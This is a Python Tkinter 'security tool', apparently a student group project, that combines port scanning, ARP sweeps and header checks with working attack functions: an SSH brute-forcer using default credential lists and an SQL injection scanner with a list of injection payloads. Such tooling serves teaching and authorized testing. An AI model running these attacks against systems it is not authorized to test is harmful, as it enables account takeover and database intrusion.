#IT142
#S3101
#TA : Multi-function Security Tool

#Group Members:

            #Diaz, David Algerico
            #Mercado, Jan Thadeus
            #Orcullo, Claros


import tkinter as tk
from tkinter import scrolledtext, messagebox, filedialog, ttk, font as tkFont
import socket
import psutil
import threading
import nmap
import paramiko
import requests
import csv
import re
import logging
import scapy.all as scapy
import netifaces
import ipaddress
import concurrent.futures

# Configure logging
logging.basicConfig(filename='security_tool.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Flag to stop scanning
stop_flag = False # No need for global declaration at module level

# Global variable for theme
is_night_mode = False

# List of default button background colors
default_button_colors = []
# List to hold button widgets
button_list = []

# --- Core Functionality ---

def resolve_host(host):
    """Resolve domain name to IP address or validate IP address."""
    logging.info(f"Resolving host: {host}")
    if not host:
        root.after(0, lambda: messagebox.showerror("Input Error", "Please enter a host, domain, or password."))
        return None
    if is_ip(host):
        logging.info(f"Host is a valid IP address: {host}")
        # Optional: Add a quick check if the IP is loopback/local
        # try:
        #     if ipaddress.ip_address(host).is_loopback:
        #         logging.info(f"Host {host} is loopback.")
        #     elif ipaddress.ip_address(host).is_private:
        #          logging.info(f"Host {host} is a private IP.")
        # except ValueError:
        #     pass # Should not happen if is_ip passed
        return host
    try:
        # Attempt DNS resolution only if it's not an IP
        resolved_ip = socket.gethostbyname(host)
        logging.info(f"Resolved {host} to IP: {resolved_ip}")
        return resolved_ip
    except socket.gaierror as e:
        logging.error(f"Resolution error for host {host}: {e}")
        root.after(0, lambda: messagebox.showerror("Resolution Error", f"Invalid or unreachable domain/host: {host}\nError: {e}"))
        return None
    except Exception as e:
        logging.error(f"Unexpected error resolving host {host}: {e}")
        root.after(0, lambda: messagebox.showerror("Resolution Error", f"Unexpected error resolving {host}."))
        return None


def is_ip(address):
    """Check if the input is an IP address."""
    pattern = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    return re.match(pattern, address) is not None

def update_result_box(message, tag=None):
    """Safely update the result box from any thread."""
    try:
        if root.winfo_exists():
            root.after(0, lambda: _insert_and_scroll(message, tag))
    except Exception as e:
        logging.error(f"Error scheduling result box update: {e}")

def _insert_and_scroll(message, tag):
    """Helper function to insert text and scroll, called by root.after."""
    try:
        if result_box.winfo_exists():
            result_box.config(state=tk.NORMAL)
            result_box.insert(tk.END, message, tag)
            result_box.see(tk.END)
            result_box.config(state=tk.DISABLED)
    except tk.TclError:
        logging.warning("Attempted to update result_box after window closed.")
    except Exception as e:
        logging.error(f"Error updating result box content: {e}")


def scan_ports():
    """Perform port scanning using nmap."""
    global stop_flag
    stop_flag = False
    host = entry_ip.get()
    resolved_ip = resolve_host(host)
    if not resolved_ip:
        return

    update_result_box(f"Scanning {resolved_ip} for open ports...\n", 'info')
    scanner = None
    try:
        scanner = nmap.PortScanner()
    except nmap.PortScannerError as e:
        update_result_box(f"Nmap Error: {e}. Is Nmap installed and in PATH?\n", 'error')
        return
    except Exception as e:
        update_result_box(f"Error initializing Nmap: {e}\n", 'error')
        return

    common_ports = '22,80,443,21,25,53,110,143,3389'
    ports_to_scan = common_ports.split(',')

    try:
        scanner.scan(resolved_ip, common_ports, arguments='-Pn') # Skip host discovery
    except nmap.PortScannerError as e:
        update_result_box(f"Nmap scan error for {resolved_ip}: {e}\n", 'error')
        return
    except Exception as e:
        update_result_box(f"Unexpected error during Nmap scan: {e}\n", 'error')
        return

    open_ports_found = False
    if resolved_ip in scanner.all_hosts():
        if 'tcp' in scanner[resolved_ip]:
            tcp_ports = scanner[resolved_ip]['tcp']
            for port in tcp_ports.keys():
                if stop_flag:
                    update_result_box("Port scanning stopped by user.\n", 'stopped')
                    return
                if tcp_ports[port]['state'] == 'open':
                    service = tcp_ports[port].get('name', 'unknown')
                    version = tcp_ports[port].get('version', '')
                    update_result_box(f"Port {port}/TCP ({service} {version}) is OPEN\n", 'open')
                    open_ports_found = True
        else:
            update_result_box(f"No TCP port information found for {resolved_ip}.\n", 'info')
    else:
        update_result_box(f"Host {resolved_ip} not found in scan results (maybe down or blocked?).\n", 'info')


    if not open_ports_found and not stop_flag:
        update_result_box(f"No common open ports found on {resolved_ip}.\n", 'closed')

    if not stop_flag:
        update_result_box("Port scan complete.\n", 'info')

def threaded_scan_ports():
    """Thread wrapper for scan_ports."""
    # Disable button during scan? Optional.
    threading.Thread(target=scan_ports, daemon=True).start()

def brute_force_ssh():
    """Perform a brute-force SSH attack."""
    global stop_flag
    stop_flag = False
    host = entry_ip.get()
    resolved_ip = resolve_host(host)
    if not resolved_ip:
        update_result_box("Invalid host for SSH Brute Force.\n", 'error')
        return
    # Ensure it's actually an IP for SSH
    if not is_ip(resolved_ip):
        update_result_box("SSH Brute Force requires a valid IP address, not a domain name.\n", 'error')
        return

    update_result_box(f"Starting SSH Brute Force on {resolved_ip}...\n", 'info')
    common_usernames = ['root', 'admin', 'user', 'test', 'guest']
    common_passwords = ['password', '123456', 'admin', 'root', '1234', 'test', 'guest', 'user']

    found_creds = False
    for username in common_usernames:
        for password in common_passwords:
            if stop_flag:
                update_result_box("SSH Brute Force stopped by user.\n", 'stopped')
                return
            client = None
            try:
                update_result_box(f"Trying {username}:{password}...\n", 'info_faint')
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(resolved_ip, port=22, username=username, password=password, timeout=5)
                update_result_box(f"Success! Found credentials: {username}:{password}\n", 'open')
                found_creds = True
                return
            except paramiko.AuthenticationException:
                update_result_box(f"Failed: {username}:{password}\n", 'closed')
            except paramiko.SSHException as e:
                update_result_box(f"SSH Error (check SSH service on port 22): {e}\n", 'error')
            except socket.timeout:
                update_result_box(f"Timeout connecting to {resolved_ip} for {username}:{password}\n", 'error')
            except socket.error as e:
                update_result_box(f"Socket Error connecting to {resolved_ip}: {e}\n", 'error')
                return # Stop if connection refused etc.
            except Exception as e:
                update_result_box(f"Unexpected Connection Error: {e}\n", 'error')
                return
            finally:
                if client:
                    try:
                        client.close()
                    except Exception as close_e:
                        logging.error(f"Error closing SSH client: {close_e}")

    if not found_creds and not stop_flag:
        update_result_box("SSH Brute Force complete. No common credentials found.\n", 'info')
    elif not stop_flag:
        update_result_box("SSH Brute Force complete.\n", 'info')


def threaded_brute_force_ssh():
    """Thread wrapper for brute_force_ssh."""
    threading.Thread(target=brute_force_ssh, daemon=True).start()


def sql_injection_scan():
    """Check for basic SQL injection vulnerabilities."""
    global stop_flag
    stop_flag = False
    url_input = entry_ip.get()
    if not url_input:
        update_result_box("Please enter a URL for SQL Injection scan.\n", 'error')
        return

    if not url_input.startswith("http://") and not url_input.startswith("https://"):
        url = "http://" + url_input
    else:
        url = url_input

    try:
        parsed = requests.utils.urlparse(url)
        if not parsed.scheme or not parsed.netloc:
            raise ValueError("Invalid URL structure")
    except ValueError:
        update_result_box(f"Input '{url_input}' doesn't look like a valid URL.\n", 'error')
        return

    update_result_box(f"Starting basic SQL Injection scan on {url}...\n", 'info')
    payloads = [
        "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*",
        "admin' --", "admin' #", "admin'/*", "1' ORDER BY 1--", "1' ORDER BY 100--",
        "1' UNION SELECT null--", "1' UNION SELECT null,null--", "1' UNION SELECT @@version--",
        "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\" --", "') OR ('1'='1"
    ]
    vulnerability_found = False
    test_urls_with_params = []
    parsed_url = requests.utils.urlparse(url)

    if parsed_url.query:
        base_url_no_query = url.split('?', 1)[0]
        query_params = parsed_url.query.split('&')
        for i, param_val in enumerate(query_params):
            param = param_val.split('=', 1)[0]
            temp_params = query_params[:] # Create a copy
            for payload in payloads:
                # URL-encode the payload for safety
                encoded_payload = requests.utils.quote(payload)
                temp_params[i] = f"{param}={encoded_payload}"
                test_urls_with_params.append(f"{base_url_no_query}?{'&'.join(temp_params)}")
    else:
        common_params = ['id', 'user', 'cat', 'item', 'page', 'search', 'query', 'p', 'file', 'name']
        for param in common_params:
            for payload in payloads:
                encoded_payload = requests.utils.quote(payload)
                test_urls_with_params.append(f"{url}?{param}={encoded_payload}")

    update_result_box(f"Generated {len(test_urls_with_params)} test URLs/payloads...\n", 'info_faint')

    for test_url in test_urls_with_params:
        if stop_flag:
            update_result_box("SQL Injection scan stopped by user.\n", 'stopped')
            return
        update_result_box(f"Trying: {test_url[:100]}...\n", 'info_faint') # Truncate long URLs
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
            response = requests.get(test_url, timeout=10, headers=headers, allow_redirects=True)
            error_patterns = [
                "you have an error in your sql syntax", "warning: mysql",
                "unclosed quotation mark", "supplied argument is not a valid mysql",
                "sql syntax error", "pg_query()", "ora-01756",
                "microsoft ole db provider for sql server", "odbc driver",
                "sqlite error", "syntax error", "invalid sql statement"
            ]
            response_text_lower = response.text.lower()
            for error in error_patterns:
                if error in response_text_lower:
                    update_result_box(f"Possible SQL Injection vulnerability detected!\nURL: {test_url}\nError hint: '{error}' found in response.\n", 'open')
                    vulnerability_found = True
                    return

        except requests.exceptions.Timeout:
            update_result_box(f"Request timed out for {test_url[:100]}...\n", 'error')
        except requests.exceptions.ConnectionError:
            update_result_box(f"Connection Error for {test_url[:100]}...\n", 'error')
        except requests.exceptions.RequestException as e:
            update_result_box(f"Request Error for {test_url[:100]}...: {e}\n", 'error')
        except Exception as e:
            update_result_box(f"Unexpected error during SQLi scan for {test_url[:100]}...: {e}\n", 'error')
            logging.error(f"Unexpected error during SQLi scan for {test_url}: {e}")

    if not vulnerability_found and not stop_flag:
        update_result_box("Basic SQL Injection scan complete. No obvious error-based vulnerabilities found.\n", 'closed')
    elif not stop_flag:
        update_result_box("SQL Injection scan finished.\n", 'info')


def threaded_sql_injection_scan():
    """Thread wrapper for sql_injection_scan."""
    threading.Thread(target=sql_injection_scan, daemon=True).start()

def privilege_escalation():
    """Check for basic privilege escalation vectors (OS-dependent)."""
    global stop_flag
    stop_flag = False
    update_result_box("Checking for potential privilege escalation vectors (basic)...\n", 'info')
    suspicious_found = False
    try:
        target_user = 'root' if psutil.LINUX or psutil.MACOS else 'SYSTEM'
        update_result_box(f"Looking for non-standard processes running as '{target_user}'...\n", 'info_faint')
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            if stop_flag:
                update_result_box("Privilege Escalation check stopped.\n", 'stopped')
                return
            try:
                pinfo = proc.info
                # Check username exists and matches target
                if pinfo['username'] and target_user in pinfo['username'].lower():
                    common_root_procs = [
                        'systemd', 'kernel_task', 'kthreadd', 'sshd', 'cron', 'dbus-daemon',
                        'launchd', 'logind', 'NetworkManager', 'polkitd', 'rsyslogd', 'udevd',
                        'svchost.exe', 'lsass.exe', 'wininit.exe', 'services.exe',
                        'smss.exe', 'csrss.exe', 'winlogon.exe', 'fontdrvhost.exe', 'dwm.exe'
                    ]
                    is_common = False
                    proc_name_lower = pinfo['name'].lower()
                    for common in common_root_procs:
                        # More precise matching
                        if proc_name_lower == common or proc_name_lower == common.replace('.exe',''):
                            is_common = True
                            break
                    if not is_common:
                        update_result_box(f"Potentially interesting process as {pinfo['username']}: PID={pinfo['pid']}, Name={pinfo['name']}\n", 'open')
                        suspicious_found = True

            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess, TypeError, AttributeError):
                # Ignore processes we can't access, that died, or lack username info
                continue
            except Exception as e:
                logging.warning(f"Error inspecting process {proc.pid if proc else 'N/A'}: {e}")

        update_result_box("Note: SUID/SGID checks (Linux/macOS) require manual execution.\n", 'info_faint')

    except Exception as e:
        update_result_box(f"Error during privilege escalation check: {e}\n", 'error')
        logging.error(f"Error during privilege escalation check: {e}")

    if not suspicious_found and not stop_flag:
        update_result_box("Basic privilege escalation check complete. No obvious vectors found.\n", 'closed')
    elif not stop_flag:
        update_result_box("Privilege escalation check finished.\n", 'info')


def clean_results():
    """Clear the results box."""
    result_box.config(state=tk.NORMAL)
    result_box.delete(1.0, tk.END)
    result_box.config(state=tk.DISABLED)


def export_results():
    """Export results to a CSV or TXT file."""
    results_text = result_box.get(1.0, tk.END).strip()
    if not results_text:
        messagebox.showwarning("Export Empty", "There are no results to export.")
        return

    try:
        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("CSV files", "*.csv"), ("All files", "*.*")],
            title="Save Results As"
        )
        if file_path:
            with open(file_path, mode='w', newline='', encoding='utf-8') as file:
                if file_path.lower().endswith(".csv"):
                    writer = csv.writer(file)
                    for line in results_text.split('\n'):
                        writer.writerow([line])
                else:
                    file.write(results_text)
            messagebox.showinfo("Export Successful", f"Results exported successfully to\n{file_path}")
    except Exception as e:
        messagebox.showerror("Export Error", f"Error exporting results: {e}")
        logging.error(f"Error exporting results: {e}")


def stop_scanning():
    """Stop ongoing scans with confirmation."""
    global stop_flag
    active_scan_threads = [t for t in threading.enumerate() if t != threading.main_thread() and not t.name.startswith('Tkinter')]

    if not active_scan_threads:
        messagebox.showinfo("Stop Scanning", "No scans appear to be running.")
        return

    if messagebox.askyesno("Confirm Stop", "Are you sure you want to attempt to stop ongoing scans?"):
        stop_flag = True
        update_result_box("Stop signal sent. Scans might take a moment to halt...\n", 'stopped')
        logging.info("Stop scanning signal activated by user.")


def network_scanner():
    """Scan the local network for active devices using multithreading."""
    global stop_flag
    stop_flag = False
    update_result_box("Scanning local network for active devices...\n", 'info')
    ip_range = None
    gw_iface = None

    try:
        gateways = netifaces.gateways()
        default_gateway_info = gateways.get('default', {}).get(netifaces.AF_INET)

        if not default_gateway_info:
            update_result_box("Could not determine default gateway interface. Network scan unavailable.\n", 'error')
            return

        gw_ip, gw_iface = default_gateway_info
        addresses = netifaces.ifaddresses(gw_iface)

        if netifaces.AF_INET not in addresses:
            update_result_box(f"Could not get IPv4 address for interface {gw_iface}.\n", 'error')
            return

        ip_info = addresses[netifaces.AF_INET][0]
        ip_address = ip_info['addr']
        netmask = ip_info['netmask']
        network = ipaddress.ip_network(f"{ip_address}/{netmask}", strict=False)
        ip_range = str(network)
        update_result_box(f"Scanning on interface '{gw_iface}' with range: {ip_range}\n", 'info')

    except ImportError:
        update_result_box("Module 'netifaces' not found. Cannot determine local network.\nPlease install it (`pip install netifaces`).\n", 'error')
        return
    except KeyError:
        update_result_box("Could not find default gateway information.\n", 'error')
        return
    except Exception as e:
        update_result_box(f"Error fetching network interfaces: {e}\n", 'error')
        logging.error(f"Error fetching network interfaces: {e}")
        return

    if not ip_range or not gw_iface:
        update_result_box("Failed to determine IP range or interface for scanning.\n", 'error')
        return

    active_hosts_found = []
    scan_lock = threading.Lock()

    if not hasattr(network_scanner, "permission_error_shown"):
        network_scanner.permission_error_shown = False

    def scan_ip(target_ip):
        global stop_flag
        if stop_flag: return
        try:
            # Send ARP request using srp (Send and Receive Packet at Layer 2)
            # Ether() creates the Ethernet frame, ARP() creates the ARP request
            # pdst is the target IP, dst='ff:ff:ff:ff:ff:ff' is the broadcast MAC
            arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=target_ip)
            # Send packet on the specific interface, timeout 0.5s, don't print scapy output
            answered, unanswered = scapy.srp(arp_request, timeout=0.5, verbose=False, iface=gw_iface)

            if answered:
                for sent, received in answered:
                    ip = received.psrc
                    mac = received.hwsrc
                    with scan_lock:
                        if ip not in [h[0] for h in active_hosts_found]:
                            active_hosts_found.append((ip, mac))
                            update_result_box(f"Found Active Host -> IP: {ip}, MAC: {mac}\n", 'open')
        except OSError as e:
            if "Operation not permitted" in str(e) or "permission denied" in str(e).lower():
                with scan_lock:
                    if not network_scanner.permission_error_shown:
                        update_result_box("Network scan requires administrator/root privileges.\nPlease run the tool as admin/sudo.\n", 'error')
                        network_scanner.permission_error_shown = True
                return # Stop this thread
            else:
                logging.error(f"OS Error scanning IP {target_ip}: {e}")
        except Exception as e:
            logging.error(f"Error scanning IP {target_ip}: {e}")

    network_obj = ipaddress.ip_network(ip_range, strict=False)
    max_threads = 25
    network_scanner.permission_error_shown = False # Reset flag for this run

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {executor.submit(scan_ip, str(ip)) for ip in network_obj.hosts() if not stop_flag}
        concurrent.futures.wait(futures) # Wait for all submitted tasks

    if stop_flag:
        update_result_box(f"Network scan stopped by user or error.\n", 'stopped')
    elif not active_hosts_found:
        update_result_box(f"Network scan complete for {ip_range}. No active hosts found.\n", 'closed')
    else:
        update_result_box(f"Network scan complete for {ip_range}. Found {len(active_hosts_found)} active host(s).\n", 'info')


def threaded_network_scanner():
    """Thread wrapper for network_scanner."""
    threading.Thread(target=network_scanner, daemon=True).start()


def basic_vulnerability_scanner():
    """Placeholder for a basic vulnerability scanner."""
    host = entry_ip.get()
    resolved_ip = resolve_host(host)
    if not resolved_ip:
        return

    update_result_box(f"Starting basic vulnerability scan on {resolved_ip} (Placeholder)...\n", 'info')
    update_result_box("Note: This provides general hints, not a confirmed vulnerability scan.\n", 'info_faint')

    common_vulns = {
        21: "FTP: Check anonymous login, outdated versions (e.g., vsftpd 2.3.4).",
        22: "SSH: Check weak passwords (use Brute Force), outdated versions, insecure configs.",
        23: "Telnet: Insecure. Check default credentials if enabled.",
        25: "SMTP: Check open relay, version vulnerabilities.",
        53: "DNS: Check zone transfer, cache poisoning, outdated BIND.",
        80: "HTTP: Check directory listing, default files, web server/app vulns (use Web App Scanner).",
        110: "POP3: Cleartext passwords. Check version vulnerabilities.",
        143: "IMAP: Cleartext passwords. Check version vulnerabilities.",
        443: "HTTPS: Check SSL/TLS certs, weak ciphers, web server/app vulns.",
        445: "SMB: Check vulns like MS17-010 (EternalBlue), anonymous access.",
        135: "MSRPC: Often exposed on Windows, check related vulns.",
        139: "NetBIOS: Legacy file sharing, often vulnerable if exposed.",
        3306: "MySQL: Check default/weak passwords, version vulnerabilities.",
        3389: "RDP: Check weak passwords, NLA, BlueKeep (CVE-2019-0708)."
    }

    ports_found = set()
    try:
        # Make result_box temporarily writable to read from it
        result_box.config(state=tk.NORMAL)
        lines = result_box.get(1.0, tk.END).splitlines()
        result_box.config(state=tk.DISABLED) # Set back to read-only
        for line in lines:
            match = re.search(r"Port (\d+)/TCP.* is OPEN", line)
            if match:
                ports_found.add(int(match.group(1)))
    except Exception as e:
        logging.warning(f"Could not parse ports from result box: {e}")

    if not ports_found:
        update_result_box("Hint: Run 'Scan Ports' first to identify open ports for vulnerability hints.\n", 'info')
    else:
        vuln_hints_found = False
        update_result_box("Potential areas to investigate based on open ports:\n", 'info')
        for port in sorted(list(ports_found)):
            if port in common_vulns:
                update_result_box(f"- Port {port}: {common_vulns[port]}\n", 'open')
                vuln_hints_found = True
        if not vuln_hints_found:
            update_result_box("No specific vulnerability hints for the common open ports found.\n", 'closed')

    update_result_box("Basic vulnerability scan placeholder finished.\n", 'info')


def password_strength_checker():
    """Check the strength of a password against defined rules."""
    password = entry_ip.get()
    if not password:
        update_result_box("Please enter a password in the input field to check its strength.\n", 'error')
        return

    update_result_box(f"Checking strength for password: {'*' * len(password)}\n", 'info')
    errors = []
    score = 0

    if len(password) >= 12: score += 2
    elif len(password) >= 8: score += 1
    else: errors.append("Password is too short (minimum 12 characters recommended).")

    if re.search(r"[A-Z]", password): score += 1
    else: errors.append("Missing uppercase letter.")
    if re.search(r"[a-z]", password): score += 1
    else: errors.append("Missing lowercase letter.")
    if re.search(r"[0-9]", password): score += 1
    else: errors.append("Missing digit.")
    if re.search(r"[!@#$%^&*(),.?\":{}|<>~`_+\-=\[\]\\';/]", password): score += 1
    else: errors.append("Missing special character.")

    if not errors:
        update_result_box("Password meets complexity requirements (Strong).\n", 'open')
    elif score >= 4:
        update_result_box("Password is moderately strong, but consider improvements:\n", 'closed')
        for error in errors: update_result_box(f"- {error}\n", 'closed')
    else:
        update_result_box("Password is weak:\n", 'closed')
        for error in errors: update_result_box(f"- {error}\n", 'closed')


def web_application_scanner():
    """Placeholder for a basic web application scanner."""
    global stop_flag
    stop_flag = False
    url_input = entry_ip.get()
    if not url_input:
        update_result_box("Please enter a URL for Web App scan.\n", 'error')
        return

    if not url_input.startswith("http://") and not url_input.startswith("https://"):
        url = "http://" + url_input
    else:
        url = url_input

    try:
        parsed = requests.utils.urlparse(url)
        if not parsed.scheme or not parsed.netloc: raise ValueError("Invalid URL")
    except ValueError:
        update_result_box(f"Input '{url_input}' doesn't look like a valid URL.\n", 'error')
        return

    update_result_box(f"Starting basic web application scan on {url} (Placeholder)...\n", 'info')
    update_result_box("Note: This performs very basic checks only.\n", 'info_faint')

    scan_findings = []
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        response = requests.get(url, timeout=15, headers=headers, allow_redirects=True)
        response.raise_for_status()

        update_result_box(f"Checking basic headers for {url}...\n", 'info_faint')
        if 'X-Frame-Options' not in response.headers: scan_findings.append("- Missing X-Frame-Options header (Clickjacking risk).")
        if 'X-Content-Type-Options' not in response.headers: scan_findings.append("- Missing X-Content-Type-Options header (MIME sniffing risk).")
        if 'Strict-Transport-Security' not in response.headers and url.startswith("https://"): scan_findings.append("- Missing Strict-Transport-Security (HSTS) header.")
        if 'Content-Security-Policy' not in response.headers: scan_findings.append("- Missing Content-Security-Policy (CSP) header.")
        if 'Referrer-Policy' not in response.headers: scan_findings.append("- Missing Referrer-Policy header.")

        server_header = response.headers.get('Server')
        x_powered_by = response.headers.get('X-Powered-By')
        if server_header: scan_findings.append(f"- Server header found: {server_header} (Info disclosure).")
        if x_powered_by: scan_findings.append(f"- X-Powered-By header found: {x_powered_by} (Info disclosure).")

        if "index of /" in response.text.lower() and response.status_code == 200: scan_findings.append("- Potential directory listing enabled.")

        update_result_box("Note: XSS/CSRF checks require more advanced scanning.\n", 'info_faint')

    except requests.exceptions.Timeout: update_result_box(f"Connection to {url} timed out.\n", 'error')
    except requests.exceptions.ConnectionError: update_result_box(f"Could not connect to {url}.\n", 'error')
    except requests.exceptions.HTTPError as e: update_result_box(f"HTTP Error for {url}: {e.response.status_code} {e.response.reason}\n", 'error')
    except requests.exceptions.RequestException as e: update_result_box(f"Request Error for {url}: {e}\n", 'error')
    except Exception as e:
        update_result_box(f"Unexpected error during basic web check for {url}: {e}\n", 'error')
        logging.error(f"Unexpected error during basic web check for {url}: {e}")

    if scan_findings:
        update_result_box("Basic Web Scan Findings:\n", 'open')
        for finding in scan_findings: update_result_box(f"{finding}\n", 'open')
    else:
        update_result_box("No obvious issues found in basic web scan checks.\n", 'closed')

    update_result_box("Basic web application scan placeholder finished.\n", 'info')


def show_help():
    """Display help information in a Toplevel window."""
    help_text = (
        "**Multi-Function Security Tool Help**\n\n"
        "1.  **Enter Target:** Input an IP address, domain name, URL (for SQLi/Web Scan), or a password (for Strength Check) in the text field.\n\n"
        "2.  **Select Function:** Click the corresponding button on the left:\n"
        "    *   **Scan Ports:** Checks common TCP ports on the target.\n"
        "    *   **Brute Force SSH:** Attempts common credentials on SSH (port 22).\n"
        "    *   **SQL Injection Scan:** Basic checks for SQLi errors on a URL.\n"
        "    *   **Privilege Escalation:** Basic checks for suspicious root/SYSTEM processes.\n"
        "    *   **Network Scanner:** Scans local network for active hosts via ARP.\n"
        "    *   **Vuln Scanner:** (Placeholder) Basic hints based on open ports.\n"
        "    *   **Password Strength:** Checks password complexity.\n"
        "    *   **Web App Scanner:** (Placeholder) Basic header/info checks for a URL.\n"
        "    *   **Export Results:** Saves results box content to a file.\n"
        "    *   **Stop Scanning:** Attempts to stop ongoing scans.\n"
        "    *   **Clear Results:** Clears the results box.\n"
        "    *   **Help:** Shows this message.\n\n"
        "3.  **View Results:** Output appears in the box on the right.\n\n"
        "4.  **Toggle Theme:** Switch between light (Day) and dark (Night) modes.\n\n"
        "**Notes:**\n"
        "*   Network Scan may require administrator/root privileges.\n"
        "*   Use ethically and only on authorized systems.\n"
        "*   Vuln/Web Scanners are basic; use dedicated tools for full assessments."
    )
    try:
        help_win = tk.Toplevel(root)
        help_win.title("Help Information")
        help_win.geometry("550x500")
        win_bg = '#333333' if is_night_mode else '#F5F5F5'
        text_bg = '#444444' if is_night_mode else 'white'
        text_fg = 'white' if is_night_mode else 'black'
        button_bg = '#555555' if is_night_mode else '#DDDDDD' # Use a neutral button color for help close
        button_fg = 'white' if is_night_mode else 'black'

        help_win.configure(bg=win_bg)
        help_win.transient(root)
        help_win.grab_set()

        help_text_widget = scrolledtext.ScrolledText(help_win, wrap=tk.WORD, padx=10, pady=10,
                                                    bg=text_bg, fg=text_fg,
                                                    font=default_font, relief=tk.FLAT, borderwidth=0) # Use default font
        help_text_widget.pack(expand=True, fill=tk.BOTH, padx=5, pady=5)
        help_text_widget.insert(tk.END, help_text)
        # Apply bold tag to the title
        help_text_widget.tag_configure("bold_title", font=(default_font.cget("family"), default_font.cget("size"), "bold"))
        help_text_widget.tag_add("bold_title", "1.0", "1.end") # Apply to first line
        help_text_widget.tag_configure("bold_notes", font=(default_font.cget("family"), default_font.cget("size"), "bold"))
        help_text_widget.tag_add("bold_notes", "21.0", "21.end") # Apply to Notes line

        help_text_widget.config(state=tk.DISABLED)

        close_button = tk.Button(help_win, text="Close", command=help_win.destroy,
                                bg=button_bg, fg=button_fg, font=bold_font, width=10)
        close_button.pack(pady=10)

        root.update_idletasks()
        x = root.winfo_x() + (root.winfo_width() // 2) - (help_win.winfo_width() // 2)
        y = root.winfo_y() + (root.winfo_height() // 2) - (help_win.winfo_height() // 2)
        help_win.geometry(f"+{x}+{y}")

    except Exception as e:
        messagebox.showerror("Help Error", f"Could not display help window: {e}")
        logging.error(f"Error displaying help window: {e}")


def toggle_theme():
    """Toggle between day and night mode."""
    global is_night_mode
    is_night_mode = not is_night_mode

    day_colors = {
        "root_bg": "#F5F5F5", "frame_bg": "#F5F5F5", "label_fg": "#333333",
        "entry_bg": "white", "entry_fg": "black", "entry_cursor": "black",
        "button_active_bg": "#B9F6CA", "button_active_fg": "black",
        "theme_button_bg": "#DDDDDD", "theme_button_fg": "black",
        "result_bg": "white", "result_fg": "black", "result_cursor": "black",
        "theme_button_text": "Switch to Night Mode", "credit_fg": "#555555"
    }
    night_colors = {
        "root_bg": "#2E2E2E", "frame_bg": "#2E2E2E", "label_fg": "#E0E0E0", # Lighter text
        "entry_bg": "#5A5A5A", "entry_fg": "#E0E0E0", "entry_cursor": "white",
        "button_bg": "#555555", "button_fg": "white",
        "button_active_bg": "#777777", "button_active_fg": "white",
        "theme_button_bg": "#555555", "theme_button_fg": "white",
        "result_bg": "#3B3B3B", "result_fg": "#E0E0E0", "result_cursor": "white",
        "theme_button_text": "Switch to Day Mode", "credit_fg": "#AAAAAA"
    }

    current_colors = night_colors if is_night_mode else day_colors
    active_bg = current_colors["button_active_bg"]
    active_fg = current_colors["button_active_fg"]

    try:
        root.configure(bg=current_colors["root_bg"])
        content_frame.config(bg=current_colors["root_bg"]) # Theme the content frame too
        main_frame.config(bg=current_colors["frame_bg"])
        input_frame.config(bg=current_colors["frame_bg"]) # Theme input frame
        input_label.config(bg=current_colors["frame_bg"], fg=current_colors["label_fg"])
        entry_ip.config(bg=current_colors["entry_bg"], fg=current_colors["entry_fg"],
                        insertbackground=current_colors["entry_cursor"])
        button_frame.config(bg=current_colors["frame_bg"])
        result_box.config(bg=current_colors["result_bg"], fg=current_colors["result_fg"],
                        insertbackground=current_colors["result_cursor"])
        theme_button.config(bg=current_colors["theme_button_bg"], fg=current_colors["theme_button_fg"],
                            text=current_colors["theme_button_text"],
                            activebackground=active_bg, activeforeground=active_fg)
        credit_label.config(bg=current_colors["frame_bg"], fg=current_colors["credit_fg"]) # Theme credit label

        for i, button in enumerate(button_list):
            if is_night_mode:
                button.config(bg=current_colors["button_bg"], fg=current_colors["button_fg"],
                            activebackground=active_bg, activeforeground=active_fg)
            else:
                # Restore original day mode colors
                button.config(bg=default_button_colors[i], fg="white", # Keep text white
                            activebackground=active_bg, activeforeground=active_fg)
    except tk.TclError as e:
        logging.error(f"Error applying theme (window might be closing): {e}")
    except Exception as e:
        logging.error(f"Unexpected error during theme toggle: {e}")


# --- GUI Setup ---
root = tk.Tk()
root.title("Multi-Function Security Tool")
root.geometry("950x750") # Increased size slightly
root.configure(bg='#F0F0F0') # Slightly different root bg for border effect

# Define fonts
bold_font = tkFont.Font(family="Segoe UI", size=9, weight="bold")
default_font = tkFont.Font(family="Segoe UI", size=9)
result_font = tkFont.Font(family="Consolas", size=10) # Slightly larger result font
credit_font = tkFont.Font(family="Segoe UI", size=8, slant="italic")

# Main Content Frame (for border effect)
content_frame = tk.Frame(root, bg='#F5F5F5', bd=0) # Day mode color initially
content_frame.pack(expand=True, fill=tk.BOTH, padx=5, pady=5) # Padding creates the "border"

# Configure grid layout for the content_frame
content_frame.grid_rowconfigure(0, weight=1)
content_frame.grid_columnconfigure(0, weight=0, minsize=350) # Min width for left panel
content_frame.grid_columnconfigure(1, weight=1) # Right panel expands

# Left Panel Frame
main_frame = tk.Frame(content_frame, bg='#F5F5F5')
main_frame.grid(row=0, column=0, sticky="ns", padx=(0, 5)) # Stick N-S, add padding to right

# --- Input Section ---
input_frame = tk.Frame(main_frame, bg='#F5F5F5')
input_frame.pack(pady=20, anchor="center", fill=tk.X, padx=10) # Fill horizontally

input_label = tk.Label(input_frame, text="Enter Target IP / Domain / URL / Password:",
                    bg='#F5F5F5', fg='#333333', font=bold_font)
input_label.pack(pady=5)
